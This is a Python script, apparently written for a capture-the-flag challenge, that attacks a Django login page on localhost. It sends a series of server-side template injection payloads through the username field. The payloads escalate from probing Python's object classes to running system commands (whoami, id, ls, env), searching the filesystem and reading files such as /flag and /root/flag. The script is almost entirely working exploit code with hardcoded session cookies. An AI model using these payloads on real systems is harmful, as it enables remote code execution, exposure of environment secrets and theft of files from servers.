import requests
import re
import sys
import time

# Configuration
target_url = "http://127.0.0.1:33149/accounts/login"
base_headers = {
    'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
}

# Setup session with cookies
session = requests.Session()
session.cookies.set('csrftoken', 'jqE7iouiUCsy1EBJ5An435pWHCysGJD4', domain='127.0.0.1', path='/')
session.cookies.set('sessionid', '66u2wxpmyuyx2zfyxpyt7122z50a5vuy', domain='127.0.0.1', path='/')

current_csrf_token = None

def get_csrf_token():
    """Get fresh CSRF token from the page"""
    global current_csrf_token
    if current_csrf_token:
        return current_csrf_token
    
    try:
        resp = session.get(target_url, headers=base_headers, timeout=10)
        match = re.search(r'name="csrfmiddlewaretoken" value="([^"]+)"', resp.text)
        if match:
            current_csrf_token = match.group(1)
            return current_csrf_token
    except Exception as e:
        print(f"[!] Error getting CSRF token: {e}")
    
    return "ul3a3DWJvBfgDxgTusfwVE3QzYJBAzrhDBx7bRgRf3xEu1HspSsqOziC6q7T68Ub"

def test_payload(name, payload, delay=1):
    """Test a single payload"""
    try:
        csrf_token = get_csrf_token()
        
        headers = base_headers.copy()
        headers['Referer'] = target_url
        headers['Origin'] = 'http://127.0.0.1:33149'
        
        data = {
            'csrfmiddlewaretoken': csrf_token,
            'username': payload,
            'password': 'test',
            'login': 'submit'
        }
        
        response = session.post(target_url, data=data, headers=headers, 
                               timeout=15, allow_redirects=True)
        
        # Check for FLAG
        flag_match = re.search(r'FLAG\{[^}]+\}', response.text)
        if flag_match:
            print(f"\n{'='*60}")
            print(f"[!] FLAG FOUND in: {name}")
            print(f"[!] FLAG: {flag_match.group(0)}")
            print(f"{'='*60}\n")
            return True, response.text
        
        # Check if template is being evaluated (look for object representation)
        if '__main__' in response.text or 'object at' in response.text:
            print(f"[+] {name}: Template executed (no flag)")
        else:
            print(f"[-] {name}: No execution detected")
        
        return False, response.text[:500]  # Return preview only
        
    except Exception as e:
        print(f"[!] {name}: Error - {str(e)[:100]}")
        return False, str(e)
    finally:
        time.sleep(delay)

# Main testing logic
print("[*] Django SSTI/RCE Testing - Target: " + target_url)
print("[*] Starting systematic payload testing\n")

# Phase 1: Basic tests
print("="*60)
print("PHASE 1: Basic Context Objects")
print("="*60)

basic_tests = [
    ("String class", "{{''.__class__}}"),
    ("Tuple class", "{{().__class__}}"),
    ("List class", "{{[].__class__}}"),
]

for name, payload in basic_tests:
    test_payload(name, payload)

# Phase 2: Object traversal
print("\n" + "="*60)
print("PHASE 2: Object Traversal")
print("="*60)

traversal_tests = [
    ("MRO chain", "{{''.__class__.__mro__}}"),
    ("Subclasses", "{{''.__class__.__mro__[1].__subclasses__()}}"),
    ("Subclass count", "{{''.__class__.__mro__[1].__subclasses__().__len__()}}"),
]

for name, payload in traversal_tests:
    test_payload(name, payload)

# Phase 3: Test key indices (138 is common for os._wrap_close)
print("\n" + "="*60)
print("PHASE 3: Key Class Indices (critical for RCE)")
print("="*60)

key_indices = [138, 139, 140, 141, 142, 143, 144, 145]

for idx in key_indices:
    print(f"\n[*] Testing index {idx}:")
    
    # Test 1: Access __builtins__
    payload = f"{{{{''.__class__.__mro__[1].__subclasses__()[{idx}].__init__.__globals__['__builtins__']}}}}"
    test_payload(f"Index {idx} - builtins", payload, delay=0.5)
    
    # Test 2: Get os module
    payload = f"{{{{''.__class__.__mro__[1].__subclasses__()[{idx}].__init__.__globals__.get('os')}}}}"
    test_payload(f"Index {idx} - os module", payload, delay=0.5)
    
    # Test 3: List root directory
    payload = f"{{{{''.__class__.__mro__[1].__subclasses__()[{idx}].__init__.__globals__['__builtins__']['__import__']('os').listdir('/')}}}}"
    test_payload(f"Index {idx} - list root", payload, delay=0.5)
    
    # Test 4: Find FLAG files (critical!)
    payload = f"{{{{''.__class__.__mro__[1].__subclasses__()[{idx}].__init__.__globals__['__builtins__']['__import__']('subprocess').check_output(['find','/','-name','FLAG*','2>/dev/null']).decode()}}}}"
    found, result = test_payload(f"Index {idx} - find FLAG files", payload, delay=1)
    
    if found:
        print(f"[!] CRITICAL: FLAG found at index {idx}")
        sys.exit(0)
    
    # Test 5: Read common FLAG locations
    for flag_path in ['/flag', '/FLAG', '/tmp/FLAG', '/app/FLAG', '/root/flag']:
        payload = f"{{{{''.__class__.__mro__[1].__subclasses__()[{idx}].__init__.__globals__['__builtins__']['open']('{flag_path}').read()}}}}"
        found, result = test_payload(f"Index {idx} - read {flag_path}", payload, delay=0.5)
        if found:
            print(f"[!] CRITICAL: FLAG found at {flag_path}")
            sys.exit(0)

# Phase 4: Command execution attempts
print("\n" + "="*60)
print("PHASE 4: Command Execution")
print("="*60)

cmd_tests = [
    ("whoami", "{{''.__class__.__mro__[1].__subclasses__()[138].__init__.__globals__['__builtins__']['__import__']('subprocess').check_output(['whoami']).decode()}}"),
    ("id", "{{''.__class__.__mro__[1].__subclasses__()[138].__init__.__globals__['__builtins__']['__import__']('subprocess').check_output(['id']).decode()}}"),
    ("ls -la", "{{''.__class__.__mro__[1].__subclasses__()[138].__init__.__globals__['__builtins__']['__import__']('subprocess').check_output(['ls','-la']).decode()}}"),
    ("env", "{{''.__class__.__mro__[1].__subclasses__()[138].__init__.__globals__['__builtins__']['__import__']('subprocess').check_output(['env']).decode()}}"),
]

for name, payload in cmd_tests:
    found, result = test_payload(f"Cmd: {name}", payload, delay=1)
    if found:
        sys.exit(0)

# Final summary
print("\n" + "="*60)
print("[*] TESTING COMPLETE")
print("[*] If no FLAG was found above, no working payload was discovered")
print("[*] Check the detailed responses for subtle template execution signs")
print("="*60)
